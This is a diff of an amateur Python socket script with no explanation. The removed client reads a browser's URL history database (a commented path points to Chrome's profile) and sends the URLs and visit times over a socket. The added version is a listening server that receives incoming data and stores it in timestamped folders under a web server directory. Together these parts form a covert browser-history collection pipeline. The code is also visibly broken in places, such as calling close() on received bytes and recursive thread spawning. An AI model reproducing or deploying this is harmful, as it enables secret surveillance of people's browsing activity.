@@ -1,76 +1,106 @@
 import socket
-import ipaddress
 import os
-import io
+import os.path
+from os import path
+import struct
+import time
+import datetime
+from tkinter import *
+from pathlib import Path
+from time import sleep
 from io import BytesIO
 import base64
-import time
-from time import sleep
-# import datetime
-from datetime import datetime
-from tkinter import *
+import io
 import subprocess
 import sys
-import sqlite3
 import pickle
 import json
 import re
 import threading
-import struct
 import random
-# buffer = io.BytesIO()
-# t = datetime.now() 
-# # host = '192.168.1.74'
-# # host = '192.168.254.140'
+from bs4 import BeautifulSoup
+
+
+# # t = datetime.datetime.now() 
 # port = 65535
 # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect((socket.gethostname(),65535))
-# s.connect((host,port))
-port = 9000
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect((socket.gethostname(),65535))
-s.connect((socket.gethostname(), port))
+# s.bind((socket.gethostname(), 65535))
+# s.listen()
+# client, address = s.accept()
+# print("Binding socket to port: " + str(port))
+# print(f"Connection established {address[0]}'\n'{address[1]}")
+# print("connection has been established | " +"IP" + address[0] +  " | Port"  + str(address[1]))
 
-# def IsoClient():
+i = 0
+t = datetime.datetime.now() 
+v = "A"
+z = "B"
+u = "C"
+j = "D"
+port = 9000
+window = Tk()
+s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# s.bind((socket.gethostname(), 65535))
+s.bind((socket.gethostname(), port))
+s.listen()
+client, address = s.accept()
+clients = []
+kfrs = []
+
 def a():
     while True:
         try:
             # for n in range(2):
-            cNumber = random.randrange(1,10)
-            enCryp = cNumber
-            # print(enCryp)
-            s.sendall(bytes(str(enCryp), "utf-8"))
-# cNumber.close()
+            print(f'Server is listening at .....\n')
+#             # print(f'Server is listening at {t}.....\n')
+#             # client, address = s.accept()
+#             # kfr = client.recv(1024)
+            enCryp = client.recv(1024)
+            print(enCryp)
+#             # time.sleep(4)
+#             # kfrs.append(kfr)
+            kfrs.append(enCryp)
+            clients.append(client)  
+#             # time.sleep(4)
+#             # print(f'Connected with {kfr} and ipaddess is {address} \n')
+            print(f'Connected with {enCryp} and ipaddess is {address} \n')
             enCryp.close()
-            l = threading.Thread(target=a)
-            l.start()
+            j = threading.Thread(target=a)
+            j.start()
         except:
-            # thread.exit()
             break
 
 def b():
     while True:
         try:
-            conn = sqlite3.connect('yourdbfile')
-            # conn = sqlite3.connect('History',detect_types=sqlite3.PARSE_DECLTYPES)
-            # conn = sqlite3.connect('SQLite_Python.db')
-            # conn = sqlite3.connect('/Users/name/Library/Application Support/Google/Chrome/Default/yourdbfile')
-            c = conn.cursor()
-            # c.execute('''SELECT id, url, last_visit_time FROM urls''')
-            c.execute('''SELECT url, last_visit_time FROM urls''')
+            for y in range(1):
+                d = random.randrange(70,80)
 
+                a_path = '/library/webserver/documents/openpy7/'
 
-            rows = c.fetchall()
+                olderP = os.path.join(a_path,str(d))
 
-            conn.commit()
-#close the connection
-            conn.close()
-            s.sendall(bytes(str(rows),'utf-8'))
-            q = threading.Thread(target=b)
-            q.start()
+                for folders in range(5):
+                    if not os.path.exists(olderP):
+                        os.mkdir(olderP)
+                # cs = client.recv(204800)
+                cs = client.recv(408000)
+                anab ="{:%m%d%y%I%M%S}{}".format(t,v)
+                if not os.path.exists(anab):
+                        os.mkdir(anab)
+                heirP = os.path.join(olderP,anab)
+                if not os.path.exists(heirP):
+                        os.mkdir(heirP) 
+                filename = "top{}.txt".format(i)
+                tango = os.path.join(heirP,filename)
+                with open(tango, "wb") as f:
+                    f.write(cs)
+                    # f.write(data)
+                cs.close()  
+                k = threading.Thread(target=b)
+                k.start()
         except:
             break
-           
 
 if __name__ == "__main__":
     a()
